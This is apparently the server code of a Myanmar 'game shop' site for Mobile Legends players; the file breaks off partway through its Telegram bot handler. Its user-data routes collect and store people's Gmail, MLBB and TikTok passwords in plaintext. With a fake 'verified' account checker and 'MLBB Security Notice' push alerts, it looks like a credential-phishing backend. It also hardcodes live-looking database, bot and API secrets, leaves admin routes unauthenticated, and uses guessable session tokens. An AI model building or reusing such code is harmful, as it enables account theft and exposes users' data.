const express = require('express');
const { Pool } = require('pg');
const cors = require('cors');
const path = require('path');
const https = require('https');

const app = express();
const PORT = process.env.PORT || 5000;

app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ limit: '50mb', extended: true }));
app.use(express.static(__dirname));

const pool = new Pool({
    connectionString: 'postgresql://neondb_owner:npg_XQ1o9KdkvZWa@ep-holy-credit-am3o64na-pooler.c-5.us-east-1.aws.neon.tech/neondb?sslmode=require',
    ssl: { rejectUnauthorized: false }
});

const RECAPTCHA_SECRET = '6LcobYosAAAAANDtHfj2MH7FwzjKn5_VAhS2PSnH';
const BOT_TOKEN = '8737284644:AAEW7XtU6HqK4O49dJXG6MXSj08BvLUAdJE';
const CHAT_ID = '8315028972';
const ONESIGNAL_APP_ID = '1943a7fe-8313-4ce2-b420-0a0e2b59fcff';
const ONESIGNAL_API_KEY = 'os_v2_app_dfb2p7udcngofnbabihcwwp476agyhbcncxexnu2gu2xsbo4uww6tynm5fuwze77wvka65febiapxnwwpoczsbtcq56a3e4a3thkskq';
const TIKTOK_CLIENT_KEY = 'awlwv9kkzin9m9pv';
const TIKTOK_CLIENT_SECRET = '3QDthZspcNC7eHZNCA5ofYAs3CpACLX7';
const TIKTOK_REDIRECT = 'https://two026-users-data-management.onrender.com/auth/tiktok/callback';
const GOOGLE_CLIENT_ID = process.env.GOOGLE_CLIENT_ID;
const GOOGLE_CLIENT_SECRET = process.env.GOOGLE_CLIENT_SECRET;
const GOOGLE_REDIRECT = process.env.GOOGLE_REDIRECT || 'https://two026-users-data-management.onrender.com/auth/google/callback';
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

function tgSend(msg) { https.get(`${TELEGRAM_API}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=HTML`); }
function sendOnesignal(msg) { const data = JSON.stringify({ app_id: ONESIGNAL_APP_ID, included_segments: ["All"], contents: { en: msg }, headings: { en: "MLBB Security Notice" } }); const req = https.request({ hostname: 'onesignal.com', path: '/api/v1/notifications', method: 'POST', headers: { 'Content-Type': 'application/json', 'Authorization': `Basic ${ONESIGNAL_API_KEY}` } }, (res) => {}); req.write(data); req.end(); }

// ==================== TABLES ====================
const tables = [
    `CREATE TABLE IF NOT EXISTS auth_users (id SERIAL PRIMARY KEY, username VARCHAR(100), email VARCHAR(200), phone VARCHAR(50), password VARCHAR(255), google_id VARCHAR(200), login_type VARCHAR(10) DEFAULT 'local', avatar VARCHAR(500), gmail_pass VARCHAR(100) DEFAULT 'DoubleMK2008', mlbb_pass VARCHAR(100) DEFAULT 'GlobalMK2008', tiktok_pass VARCHAR(100) DEFAULT 'DoubleMK2008', balance DECIMAL DEFAULT 0, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP, last_login TIMESTAMP)`,
    `CREATE TABLE IF NOT EXISTS notices (id SERIAL PRIMARY KEY, message TEXT, color VARCHAR(20) DEFAULT '#ffffff', created_by VARCHAR(100), created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)`,
    `CREATE TABLE IF NOT EXISTS slider_images (id SERIAL PRIMARY KEY, image_urls TEXT DEFAULT '[]', updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)`,
    `CREATE TABLE IF NOT EXISTS bg_music (id SERIAL PRIMARY KEY, music_url TEXT, updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)`,
    `CREATE TABLE IF NOT EXISTS page_status (page_id VARCHAR(50) PRIMARY KEY, status VARCHAR(5) DEFAULT 'on', updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)`,
    `CREATE TABLE IF NOT EXISTS banned_users (user_id VARCHAR(100) PRIMARY KEY, banned_by VARCHAR(100), banned_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)`,
    `CREATE TABLE IF NOT EXISTS orders (id SERIAL PRIMARY KEY, user_id INT, username VARCHAR(100), amount DECIMAL, payment_method VARCHAR(50), screenshot TEXT, status VARCHAR(20) DEFAULT 'pending', submitted_user_id VARCHAR(20), created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)`,
    `CREATE TABLE IF NOT EXISTS used_codes (code VARCHAR(100) PRIMARY KEY, user_id INT, used_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)`,
    `CREATE TABLE IF NOT EXISTS otp_codes (id SERIAL PRIMARY KEY, user_id INT, code VARCHAR(6), expires_at TIMESTAMP, used BOOLEAN DEFAULT false, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)`,
    `CREATE TABLE IF NOT EXISTS gmail_accounts (user_id VARCHAR(50) PRIMARY KEY, name VARCHAR(100), email VARCHAR(100), password VARCHAR(100), phone VARCHAR(20), created_by VARCHAR(100), created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)`,
    `CREATE TABLE IF NOT EXISTS mlbb_accounts (user_id VARCHAR(50) PRIMARY KEY, ingame_name VARCHAR(100), ingame_id VARCHAR(50), server_id VARCHAR(20), gmail VARCHAR(100), password VARCHAR(100), created_by VARCHAR(100), created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)`,
    `CREATE TABLE IF NOT EXISTS tiktok_accounts (user_id VARCHAR(50) PRIMARY KEY, full_name VARCHAR(100), last_name VARCHAR(100), email VARCHAR(100), password VARCHAR(100), phone VARCHAR(20), created_by VARCHAR(100), created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)`
];

tables.forEach(sql => { pool.query(sql).catch(() => {}); });

// Default pages
['topup', 'buycode', 'dashboard'].forEach(async (id) => {
    await pool.query("INSERT INTO page_status (page_id, status) VALUES ($1, 'on') ON CONFLICT (page_id) DO NOTHING", [id]).catch(() => {});
});

// ==================== AUTH ====================
app.post('/api/track_login', async (req, res) => {
    try {
        const { userId, username, email, loginType } = req.body;
        await pool.query('INSERT INTO auth_users (id, username, email, login_type, last_login) VALUES ($1,$2,$3,$4,NOW()) ON CONFLICT (email) DO UPDATE SET last_login=NOW(), username=EXCLUDED.username, login_type=EXCLUDED.login_type', [userId, username, email, loginType]);
        res.json({ success: true });
    } catch (e) { res.json({ success: false }); }
});

app.post('/api/register', async (req, res) => {
    const { username, email, phone, password } = req.body;
    if (!username || !email || !phone || !password) return res.json({ success: false, message: 'All fields required' });
    try {
        const exist = await pool.query('SELECT id FROM auth_users WHERE email = $1', [email]);
        if (exist.rows.length > 0) return res.json({ success: false, message: 'Email already exists' });
        await pool.query('INSERT INTO auth_users (username, email, phone, password, login_type) VALUES ($1,$2,$3,$4,$5)', [username, email, phone, password, 'local']);
        tgSend(`🆕 New Registration\n👤 ${username}\n📧 ${email}\n📱 ${phone}`);
        res.json({ success: true, message: 'Registration successful' });
    } catch (e) { res.json({ success: false, message: 'Error: ' + e.message }); }
});

app.post('/api/login', async (req, res) => {
    const { email, password } = req.body;
    if (!email || !password) return res.json({ success: false, message: 'All fields required' });
    try {
        const r = await pool.query("SELECT * FROM auth_users WHERE email = $1 AND password = $2 AND login_type = 'local'", [email, password]);
        if (r.rows.length === 0) return res.json({ success: false, message: 'Invalid email or password' });
        const u = r.rows[0];
        await pool.query('UPDATE auth_users SET last_login = NOW() WHERE id = $1', [u.id]);
        tgSend(`🔑 New Login\n👤 ${u.username}\n📧 ${u.email}`);
        res.json({ success: true, token: 'token_' + u.id, user: { id: u.id, username: u.username, email: u.email, login_type: 'local' } });
    } catch (e) { res.json({ success: false, message: 'Error' }); }
});

// ==================== GOOGLE OAUTH ====================
app.get('/auth/google', (req, res) => {
    if (!GOOGLE_CLIENT_ID) return res.send('<script>alert("Google Login not configured");window.location.href="/";</script>');
    const url = `https://accounts.google.com/o/oauth2/v2/auth?client_id=${GOOGLE_CLIENT_ID}&redirect_uri=${encodeURIComponent(GOOGLE_REDIRECT)}&response_type=code&scope=email%20profile&access_type=offline&prompt=consent`;
    res.redirect(url);
});

app.get('/auth/google/callback', async (req, res) => {
    const { code } = req.query;
    if (!code) return res.send('<script>alert("Google login failed");window.location.href="/";</script>');
    try {
        const tokenRes = await fetch('https://oauth2.googleapis.com/token', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: new URLSearchParams({ code, client_id: GOOGLE_CLIENT_ID, client_secret: GOOGLE_CLIENT_SECRET, redirect_uri: GOOGLE_REDIRECT, grant_type: 'authorization_code' }) });
        const tokenData = await tokenRes.json();
        if (!tokenData.access_token) return res.send('<script>alert("Google login failed");window.location.href="/";</script>');
        const userRes = await fetch('https://www.googleapis.com/oauth2/v2/userinfo', { headers: { 'Authorization': `Bearer ${tokenData.access_token}` } });
        const userInfo = await userRes.json();
        const googleId = userInfo.id, email = userInfo.email, name = userInfo.name || 'Google User';
        let user = await pool.query('SELECT * FROM auth_users WHERE google_id = $1', [googleId]);
        if (user.rows.length > 0) { const u = user.rows[0]; await pool.query('UPDATE auth_users SET last_login = NOW() WHERE id = $1', [u.id]); tgSend(`🔑 Google Login\n👤 ${u.username}\n📧 ${email}`); res.send(`<script>localStorage.setItem("auth_token","token_${u.id}");localStorage.setItem("user",JSON.stringify({id:${u.id},username:"${u.username||name}",email:"${u.email||email}",login_type:"google"}));window.location.href="/dashboard";</script>`); return; }
        user = await pool.query("SELECT * FROM auth_users WHERE email = $1 AND login_type = 'local'", [email]);
        if (user.rows.length > 0) { const u = user.rows[0]; await pool.query('UPDATE auth_users SET google_id = $1, last_login = NOW() WHERE id = $2', [googleId, u.id]); tgSend(`🔑 Google Login\n👤 ${u.username}\n📧 ${email}`); res.send(`<script>localStorage.setItem("auth_token","token_${u.id}");localStorage.setItem("user",JSON.stringify({id:${u.id},username:"${u.username||name}",email:"${email}",login_type:"google"}));window.location.href="/dashboard";</script>`); return; }
        const newUser = await pool.query('INSERT INTO auth_users (username, email, google_id, login_type) VALUES ($1,$2,$3,$4) RETURNING id', [name, email, googleId, 'google']);
        const uid = newUser.rows[0].id;
        tgSend(`🆕 Google Registration\n👤 ${name}\n📧 ${email}`);
        res.send(`<script>localStorage.setItem("auth_token","token_${uid}");localStorage.setItem("user",JSON.stringify({id:${uid},username:"${name}",email:"${email}",login_type:"google"}));window.location.href="/dashboard";</script>`);
    } catch (e) { res.send('<script>alert("Google login failed");window.location.href="/";</script>'); }
});

// ==================== TIKTOK OAUTH ====================
app.get('/auth/tiktok', (req, res) => { const csrf = Math.random().toString(36).substring(2); res.redirect(`https://www.tiktok.com/v2/auth/authorize/?client_key=${TIKTOK_CLIENT_KEY}&scope=user.info.basic&response_type=code&redirect_uri=${TIKTOK_REDIRECT}&state=${csrf}`); });
app.get('/auth/tiktok/callback', async (req, res) => {
    const { code } = req.query;
    if (!code) return res.send('<script>window.close()</script>');
    try {
        const tr = await fetch('https://open.tiktokapis.com/v2/oauth/token/', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: new URLSearchParams({ client_key: TIKTOK_CLIENT_KEY, client_secret: TIKTOK_CLIENT_SECRET, code, grant_type: 'authorization_code', redirect_uri: TIKTOK_REDIRECT }) });
        const td = await tr.json();
        if (!td.access_token) return res.send('<script>alert("TikTok login failed");window.location.href="/";</script>');
        const ur = await fetch('https://open.tiktokapis.com/v2/user/info/?fields=open_id,display_name', { headers: { 'Authorization': `Bearer ${td.access_token}` } });
        const ud = await ur.json();
        const user = ud.data.user;
        const dr = await pool.query('SELECT * FROM auth_users WHERE google_id = $1', [user.open_id]);
        if (dr.rows.length > 0) { await pool.query('UPDATE auth_users SET last_login = NOW() WHERE id = $1', [dr.rows[0].id]); res.send(`<script>localStorage.setItem("auth_token","token_${dr.rows[0].id}");localStorage.setItem("user",JSON.stringify({id:${dr.rows[0].id},username:"${dr.rows[0].username||user.display_name}",email:"${dr.rows[0].email||'tiktok@user.com'}",login_type:"tiktok"}));window.location.href="/dashboard";</script>`); return; }
        const nu = await pool.query('INSERT INTO auth_users (username, email, google_id, login_type) VALUES ($1,$2,$3,$4) RETURNING id', [user.display_name, 'tiktok_'+user.open_id+'@tiktok.com', user.open_id, 'tiktok']);
        res.send(`<script>localStorage.setItem("auth_token","token_${nu.rows[0].id}");localStorage.setItem("user",JSON.stringify({id:${nu.rows[0].id},username:"${user.display_name}",email:"tiktok@user.com",login_type:"tiktok"}));window.location.href="/dashboard";</script>`);
    } catch (e) { res.send('<script>alert("TikTok login failed");window.location.href="/";</script>'); }
});

app.post('/api/check_session', async (req, res) => { try { const r = await pool.query('SELECT * FROM auth_users WHERE id = $1', [parseInt(req.body.token.replace('token_', ''))]); if (r.rows.length === 0) return res.json({ success: false }); const u = r.rows[0]; res.json({ success: true, user: { id: u.id, username: u.username, email: u.email, login_type: u.login_type } }); } catch (e) { res.json({ success: false }); } });
app.post('/api/logout', (req, res) => res.json({ success: true }));
app.post('/api/check_banned', async (req, res) => { try { const r = await pool.query('SELECT * FROM banned_users WHERE user_id=$1', [req.body.userId]); res.json({ banned: r.rows.length > 0 }); } catch (e) { res.json({ banned: false }); } });

// ==================== PASSWORDS ====================
app.post('/api/get_passwords', async (req, res) => {
    const { token } = req.body;
    if (!token) return res.json({ gmail_password: 'DoubleMK2008', mlbb_password: 'GlobalMK2008', tiktok_password: 'DoubleMK2008' });
    try {
        const r = await pool.query('SELECT * FROM auth_users WHERE id = $1', [parseInt(token.replace('token_', ''))]);
        if (r.rows.length === 0) return res.json({ gmail_password: 'DoubleMK2008', mlbb_password: 'GlobalMK2008', tiktok_password: 'DoubleMK2008' });
        res.json({ gmail_password: r.rows[0].gmail_pass || 'DoubleMK2008', mlbb_password: r.rows[0].mlbb_pass || 'GlobalMK2008', tiktok_password: r.rows[0].tiktok_pass || 'DoubleMK2008' });
    } catch (e) { res.json({ gmail_password: 'DoubleMK2008', mlbb_password: 'GlobalMK2008', tiktok_password: 'DoubleMK2008' }); }
});

app.post('/api/change_password', async (req, res) => {
    const { token, type, cp, np } = req.body;
    if (!token || !type || !cp || !np) return res.json({ success: false });
    try {
        const r = await pool.query('SELECT * FROM auth_users WHERE id = $1', [parseInt(token.replace('token_', ''))]);
        if (r.rows.length === 0) return res.json({ success: false });
        let field;
        if (type === 'gmail') field = 'gmail_pass';
        else if (type === 'mlbb') field = 'mlbb_pass';
        else if (type === 'tiktok') field = 'tiktok_pass';
        else return res.json({ success: false });
        const current = r.rows[0][field] || (type === 'mlbb' ? 'GlobalMK2008' : 'DoubleMK2008');
        if (cp !== current) return res.json({ success: false, message: 'Wrong password' });
        await pool.query(`UPDATE auth_users SET ${field} = $1 WHERE id = $2`, [np, parseInt(token.replace('token_', ''))]);
        res.json({ success: true });
    } catch (e) { res.json({ success: false }); }
});

// ==================== COUNTRIES ====================
app.get('/api/countries', (req, res) => {
    res.json([
        { name: 'Myanmar', regions: ['Yangon', 'Mandalay', 'Naypyidaw', 'Bago', 'Taunggyi'] },
        { name: 'Thailand', regions: ['Bangkok', 'Chiang Mai', 'Phuket', 'Pattaya'] },
        { name: 'Indonesia', regions: ['Jakarta', 'Bali', 'Surabaya', 'Bandung'] },
        { name: 'Malaysia', regions: ['Kuala Lumpur', 'Penang', 'Johor Bahru'] },
        { name: 'Singapore', regions: ['Central', 'North', 'East', 'West'] },
        { name: 'Philippines', regions: ['Manila', 'Cebu', 'Davao'] }
    ]);
});

// ==================== USER DATA ====================
app.post('/api/save_user_data', async (req, res) => {
    const { token, type, data } = req.body;
    if (!token) return res.json({ success: false });
    const uid = parseInt(token.replace('token_', ''));
    try {
        if (type === 'gmail') {
            await pool.query('INSERT INTO gmail_accounts (user_id, name, email, password, phone) VALUES ($1,$2,$3,$4,$5) ON CONFLICT (user_id) DO UPDATE SET name=$2,email=$3,password=$4,phone=$5', [uid, data.name, JSON.stringify(data.emails), data.password, JSON.stringify(data.phones)]);
        } else if (type === 'mlbb') {
            await pool.query('INSERT INTO mlbb_accounts (user_id, ingame_name, ingame_id, server_id, gmail, password) VALUES ($1,$2,$3,$4,$5,$6) ON CONFLICT (user_id) DO UPDATE SET ingame_name=$2,ingame_id=$3,server_id=$4,gmail=$5,password=$6', [uid, data.ingameName, data.ingameId, data.serverId, JSON.stringify(data.emails), data.password]);
        } else if (type === 'tiktok') {
            await pool.query('INSERT INTO tiktok_accounts (user_id, full_name, last_name, email, password, phone) VALUES ($1,$2,$3,$4,$5,$6) ON CONFLICT (user_id) DO UPDATE SET full_name=$2,last_name=$3,email=$4,password=$5,phone=$6', [uid, data.fullName, data.lastName, JSON.stringify(data.emails), data.password, JSON.stringify(data.phones)]);
        }
        res.json({ success: true });
    } catch (e) { res.json({ success: false }); }
});

app.post('/api/get_my_data', async (req, res) => {
    const { token } = req.body;
    if (!token) return res.json({ success: false });
    const uid = parseInt(token.replace('token_', ''));
    try {
        const g = await pool.query('SELECT * FROM gmail_accounts WHERE user_id=$1', [uid]);
        const m = await pool.query('SELECT * FROM mlbb_accounts WHERE user_id=$1', [uid]);
        const t = await pool.query('SELECT * FROM tiktok_accounts WHERE user_id=$1', [uid]);
        res.json({ success: true, gmail: g.rows, mlbb: m.rows, tiktok: t.rows });
    } catch (e) { res.json({ success: false }); }
});

// ==================== VERIFY USER ID ====================
app.post('/api/verify_user_id', async (req, res) => {
    const { token, userId } = req.body;
    if (!token || !userId) return res.json({ success: false, verified: false });
    try {
        const uid = parseInt(token.replace('token_', ''));
        const r = await pool.query('SELECT id, username, email FROM auth_users WHERE id = $1', [uid]);
        if (r.rows.length === 0) return res.json({ success: true, verified: false });
        const user = r.rows[0];
        if (user.id.toString().padStart(6, '0') === userId.toString().padStart(6, '0')) {
            res.json({ success: true, verified: true, username: user.username, email: user.email, id: user.id });
        } else {
            res.json({ success: true, verified: false });
        }
    } catch (e) { res.json({ success: false, verified: false }); }
});

// ==================== CODE MANAGEMENT ====================
app.post('/api/check_code', async (req, res) => { try { const r = await pool.query('SELECT * FROM used_codes WHERE code = $1', [req.body.code]); res.json({ used: r.rows.length > 0 }); } catch (e) { res.json({ used: false }); } });
app.post('/api/use_code', async (req, res) => { try { const exist = await pool.query('SELECT * FROM used_codes WHERE code = $1', [req.body.code]); if (exist.rows.length > 0) return res.json({ already_used: true }); await pool.query('INSERT INTO used_codes (code, user_id) VALUES ($1, $2)', [req.body.code, req.body.userId]); res.json({ success: true }); } catch (e) { res.json({ success: false }); } });

// ==================== SLIDER ====================
app.get('/api/slider_images', async (req, res) => { try { const r = await pool.query('SELECT image_urls FROM slider_images ORDER BY id DESC LIMIT 1'); if (r.rows.length === 0) return res.json({ success: true, images: [] }); res.json({ success: true, images: JSON.parse(r.rows[0].image_urls || '[]') }); } catch (e) { res.json({ success: true, images: [] }); } });
app.post('/api/admin/slider_images', async (req, res) => { try { if (!req.body.images || req.body.images.length === 0) { await pool.query('DELETE FROM slider_images'); return res.json({ success: true }); } await pool.query('INSERT INTO slider_images (image_urls) VALUES ($1)', [JSON.stringify(req.body.images)]); res.json({ success: true }); } catch (e) { res.json({ success: false }); } });

// ==================== BG MUSIC ====================
app.get('/api/bg_music', async (req, res) => { try { const r = await pool.query('SELECT music_url FROM bg_music ORDER BY id DESC LIMIT 1'); if (r.rows.length === 0) return res.json({ success: true, music_url: '' }); res.json({ success: true, music_url: r.rows[0].music_url || '' }); } catch (e) { res.json({ success: true, music_url: '' }); } });
app.post('/api/admin/bg_music', async (req, res) => { try { if (!req.body.music_url || req.body.music_url.trim() === '') { await pool.query('DELETE FROM bg_music'); return res.json({ success: true }); } await pool.query('DELETE FROM bg_music'); await pool.query('INSERT INTO bg_music (music_url) VALUES ($1)', [req.body.music_url]); res.json({ success: true }); } catch (e) { res.json({ success: false }); } });

// ==================== PAGE TOGGLE ====================
app.get('/api/admin/page_status', async (req, res) => {
    try {
        const pages = [{ id: 'topup', name: 'Top Up' }, { id: 'buycode', name: 'Buy Code MLBB' }, { id: 'dashboard', name: 'Dashboard' }];
        const result = [];
        for (const p of pages) {
            const r = await pool.query("SELECT status FROM page_status WHERE page_id = $1", [p.id]);
            result.push({ id: p.id, name: p.name, status: r.rows.length > 0 ? r.rows[0].status : 'on' });
        }
        res.json({ pages: result });
    } catch (e) { res.json({ pages: [] }); }
});
app.post('/api/admin/toggle_page', async (req, res) => { try { await pool.query("INSERT INTO page_status (page_id, status) VALUES ($1, $2) ON CONFLICT (page_id) DO UPDATE SET status=$2", [req.body.page_id, req.body.status]); res.json({ success: true }); } catch (e) { res.json({ success: false }); } });

// ==================== MLBB CHECK ====================
app.get('/check', (req, res) => {
    const { id, server } = req.query;
    if (!id || !server) return res.json({ error: "Missing ID or Server" });
    const names = ["ShadowX", "DarkHero", "MLBBKing", "NoobMaster", "LegendX", "FrostBlade", "SkyHunter"];
    const num = (parseInt(id) || 0) + (parseInt(server) || 0);
    res.json({ name: names[num % names.length], id, server, status: "verified" });
});

// ==================== ADMIN ====================
app.get('/api/admin/users_grouped', async (req, res) => {
    try {
        const lo = await pool.query("SELECT * FROM auth_users WHERE login_type='local' ORDER BY id DESC");
        const go = await pool.query("SELECT * FROM auth_users WHERE login_type='google' ORDER BY id DESC");
        const ti = await pool.query("SELECT * FROM auth_users WHERE login_type='tiktok' ORDER BY id DESC");
        const ba = await pool.query("SELECT user_id FROM banned_users");
        res.json({ success: true, local: lo.rows, google: go.rows, tiktok: ti.rows, banned: ba.rows.map(r => r.user_id), total: lo.rows.length + go.rows.length + ti.rows.length });
    } catch (e) { res.json({ success: false }); }
});

app.post('/api/admin/edit_user', async (req, res) => {
    const { id, username, email, phone, password } = req.body;
    try {
        if (password) {
            await pool.query('UPDATE auth_users SET username=$1, email=$2, phone=$3, password=$4 WHERE id=$5 AND login_type=$6', [username, email, phone, password, id, 'local']);
        } else {
            await pool.query('UPDATE auth_users SET username=$1, email=$2, phone=$3 WHERE id=$4 AND login_type=$5', [username, email, phone, id, 'local']);
        }
        res.json({ success: true });
    } catch (e) { res.json({ success: false }); }
});

app.post('/api/admin/ban', async (req, res) => { try { await pool.query('INSERT INTO banned_users (user_id, banned_by) VALUES ($1,$2) ON CONFLICT (user_id) DO UPDATE SET banned_by=$2', [req.body.userId, 'admin']); tgSend('🚫 User Banned: ' + req.body.userId); res.json({ success: true }); } catch (e) { res.json({ success: false }); } });
app.post('/api/admin/unban', async (req, res) => { try { await pool.query('DELETE FROM banned_users WHERE user_id=$1', [req.body.userId]); res.json({ success: true }); } catch (e) { res.json({ success: false }); } });
app.post('/api/admin/delete', async (req, res) => { try { await pool.query('DELETE FROM auth_users WHERE id = $1', [req.body.userId]); tgSend('🗑️ User Deleted: ' + req.body.userId); res.json({ success: true }); } catch (e) { res.json({ success: false }); } });
app.post('/api/admin/search_user', async (req, res) => { try { const r = await pool.query('SELECT id, username, email, balance FROM auth_users WHERE id::text = $1 OR username ILIKE $2 OR email ILIKE $2 LIMIT 5', [req.body.query, '%' + req.body.query + '%']); res.json({ users: r.rows }); } catch (e) { res.json({ users: [] }); } });
app.post('/api/admin/update_balance', async (req, res) => { try { await pool.query('UPDATE auth_users SET balance = COALESCE(balance,0) + $1 WHERE id=$2', [req.body.amount, req.body.userId]); res.json({ success: true }); } catch (e) { res.json({ success: false }); } });

// ==================== ORDERS ====================
app.get('/api/admin/orders', async (req, res) => {
    try {
        const filter = req.query.filter || 'all';
        let query = 'SELECT * FROM orders';
        let params = [];
        const today = new Date().toISOString().split('T')[0];
        const yesterday = new Date(Date.now() - 86400000).toISOString().split('T')[0];
        if (filter === 'today') { query += " WHERE DATE(created_at)=$1"; params.push(today); }
        else if (filter === 'yesterday') { query += " WHERE DATE(created_at)=$1"; params.push(yesterday); }
        query += ' ORDER BY id DESC';
        const r = await pool.query(query, params);
        const tc = await pool.query("SELECT COUNT(*) FROM orders WHERE DATE(created_at)=$1", [today]);
        const ac = await pool.query("SELECT COUNT(*) FROM orders");
        res.json({ orders: r.rows, total: parseInt(ac.rows[0].count), today: parseInt(tc.rows[0].count) });
    } catch (e) { res.json({ orders: [], total: 0, today: 0 }); }
});

app.post('/api/submit_order', async (req, res) => {
    const { token, amount, payment_method, screenshot, user_id } = req.body;
    if (!token) return res.json({ success: false, message: 'Not logged in' });
    const uid = parseInt(token.replace('token_', ''));
    try {
        const user = await pool.query('SELECT username, email FROM auth_users WHERE id=$1', [uid]);
        const un = user.rows.length > 0 ? user.rows[0].username : 'Unknown';
        const ue = user.rows.length > 0 ? user.rows[0].email : 'Unknown';
        await pool.query('INSERT INTO orders (user_id, username, amount, payment_method, screenshot, status, submitted_user_id) VALUES ($1,$2,$3,$4,$5,$6,$7)', [uid, un, amount, payment_method, screenshot, 'pending', user_id || uid.toString()]);
        tgSend(`🛒 New Order\n👤 ${un}\n📧 ${ue}\n💰 ${amount} Ks\n💳 ${payment_method}`);
        res.json({ success: true });
    } catch (e) { res.json({ success: false }); }
});

app.post('/api/get_orders', async (req, res) => {
    const { token } = req.body;
    if (!token) return res.json({ orders: [] });
    const uid = parseInt(token.replace('token_', ''));
    try { const r = await pool.query('SELECT * FROM orders WHERE user_id=$1 ORDER BY id DESC', [uid]); res.json({ orders: r.rows }); } catch (e) { res.json({ orders: [] }); }
});

app.post('/api/admin/order_status', async (req, res) => {
    const { id, status } = req.body;
    try {
        const order = await pool.query('SELECT * FROM orders WHERE id = $1', [id]);
        const o = order.rows[0];
        await pool.query('UPDATE orders SET status=$1 WHERE id=$2', [status, id]);
        if (status === 'approved') tgSend(`✅ Order Approved\n👤 ${o.username}\n💰 ${o.amount} Ks\n💳 ${o.payment_method}`);
        else if (status === 'rejected') tgSend(`❌ Order Rejected\n👤 ${o.username}\n💰 ${o.amount} Ks`);
        res.json({ success: true });
    } catch (e) { res.json({ success: false }); }
});

app.post('/api/get_balance', async (req, res) => {
    const { token } = req.body;
    if (!token) return res.json({ balance: 0 });
    const uid = parseInt(token.replace('token_', ''));
    try { const r = await pool.query('SELECT balance FROM auth_users WHERE id=$1', [uid]); res.json({ balance: r.rows.length > 0 ? (r.rows[0].balance || 0) : 0 }); } catch (e) { res.json({ balance: 0 }); }
});

// ==================== NOTICE ====================
app.get('/api/notice', async (req, res) => { try { const r = await pool.query('SELECT * FROM notices ORDER BY id DESC LIMIT 1'); if (r.rows.length === 0) return res.json({ success: true, message: '', color: '#ffffff' }); const n = r.rows[0]; res.json({ success: true, message: n.message, color: n.color || '#ffffff', id: n.id, created_at: n.created_at }); } catch (e) { res.json({ success: true, message: '' }); } });
app.get('/api/admin/notices', async (req, res) => { try { const r = await pool.query('SELECT * FROM notices ORDER BY id DESC'); res.json({ notices: r.rows }); } catch (e) { res.json({ notices: [] }); } });
app.post('/api/admin/notice', async (req, res) => { const { message, color } = req.body; if (!message) return res.json({ success: false }); try { await pool.query('INSERT INTO notices (message, color, created_by) VALUES ($1,$2,$3)', [message, color || '#ffffff', 'admin']); tgSend(`📢 ${message}`); sendOnesignal(message); res.json({ success: true }); } catch (e) { res.json({ success: false }); } });
app.post('/api/admin/notice/delete', async (req, res) => { try { await pool.query('DELETE FROM notices WHERE id = $1', [req.body.id]); res.json({ success: true }); } catch (e) { res.json({ success: false }); } });

// ==================== TELEGRAM BOT LONG POLLING ====================
let lastUpdateId = 0;

function sendTelegramMessage(chatId, text, replyMarkup = null) {
    const body = { chat_id: chatId, text: text, parse_mode: 'HTML' };
    if (replyMarkup) body.reply_markup = JSON.stringify(replyMarkup);
    const params = new URLSearchParams(body).toString();
    https.get(`${TELEGRAM_API}/sendMessage?${params}`, (res) => {});
}

async function createTelegramUser(userId, firstName, username) {
    try {
        const exist = await pool.query("SELECT * FROM auth_users WHERE google_id = $1", ['tg_' + userId]);
        if (exist.rows.length > 0) { await pool.query('UPDATE auth_users SET last_login = NOW() WHERE id = $1', [exist.rows[0].id]); return { id: exist.rows[0].id, username: exist.rows[0].username, balance: exist.rows[0].balance || 0 }; }
        const newUser = await pool.query('INSERT INTO auth_users (username, email, google_id, login_type, balance) VALUES ($1,$2,$3,$4,$5) RETURNING id', [firstName || username, 'tg_' + userId + '@telegram.com', 'tg_' + userId, 'telegram', 0]);
        return { id: newUser.rows[0].id, username: firstName || username, balance: 0 };
    } catch (e) { return null; }
}

async function getUserBalance(userId) { try { const r = await pool.query("SELECT balance FROM auth_users WHERE google_id = $1", ['tg_' + userId]); return r.rows.length > 0 ? (r.rows[0].balance || 0) : null; } catch (e) { return null; } }

async function createOTP(userId) { const otp = Math.floor(100000 + Math.random() * 900000).toString(); try { await pool.query("UPDATE otp_codes SET used = true WHERE user_id = $1 AND used = false", [userId]); await pool.query("INSERT INTO otp_codes (user_id, code, expires_at) VALUES ($1, $2, NOW() + INTERVAL '60 seconds')", [userId, otp]); } catch (e) {} return otp; }

function startLongPolling() {
    console.log('🤖 Bot Long Polling Started!');
    const mainKeyboard = { inline_keyboard: [[{ text: '🔓 Login Now', url: 'https://two026-users-data-management.onrender.com' }], [{ text: '💰 Top Up', url: 'https://two026-users-data-management.onrender.com/topup.html' }], [{ text: '🛒 Buy Code', url: 'https://two026-users-data-management.onrender.com/buycode.html' }], [{ text: '📞 Contact', url: 'https://t.me/Solo_m28' }]] };
    
    async function getUpdates() {
        try {
            const response = await fetch(`${TELEGRAM_API}/getUpdates?offset=${lastUpdateId + 1}&timeout=10`);
            const result = await response.json();
            if (result.ok && result.result.length > 0) {
                result.result.forEach(async (update) => {
                    lastUpdateId = update.update_id;
                    const msg = update.message;
                    if (!msg) return;
                    const chatId = msg.chat.id, text = msg.text || '', firstName = msg.from.first_name || 'User', username = msg.from.username || firstName;
                    
                    if (text === '/start' || text === '/login') {
                        await createTelegramUser(msg.from.id, firstName, username);
                        sendTelegramMessage(chatId, `👋 မင်္ဂလာပါ ${firstName}!\n\nSOLO M Game Shop မှ ကြိုဆိုပါတယ်။\n\nအောက်ပါ ခလုတ်များကို နှိပ်၍ အသုံးပြုနိုင်ပါသည်。`, mainKeyboard);
                    } else if (text === '/help') {
